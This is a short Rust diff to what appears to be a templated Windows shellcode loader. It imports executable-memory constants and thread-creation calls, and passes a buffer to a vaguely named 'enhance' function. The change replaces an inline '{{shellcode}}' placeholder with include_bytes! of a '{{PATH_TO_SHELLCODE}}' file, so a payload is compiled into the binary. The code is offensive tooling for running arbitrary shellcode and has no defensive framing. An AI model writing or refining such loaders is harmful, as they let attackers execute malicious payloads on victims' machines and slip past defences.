@@ -5,7 +5,7 @@ use windows::Win32::System::Memory::{MEM_COMMIT, PAGE_EXECUTE_READ, PAGE_READWRI
 use windows::Win32::System::Threading::CreateThread;
 use windows::Win32::System::Threading::WaitForSingleObject;
 use windows::Win32::System::Threading::THREAD_CREATION_FLAGS;
-
+use std::include_bytes;
 
 
 fn enhance(buf: &[u8]) {
@@ -28,6 +28,6 @@ fn enhance(buf: &[u8]) {
     }
 }
 fn main() {
-    let buf: Vec<u8> = vec!{{shellcode}};
-    enhance(&buf);
+    let buf = include_bytes!({{PATH_TO_SHELLCODE}});
+    enhance(buf);
 }
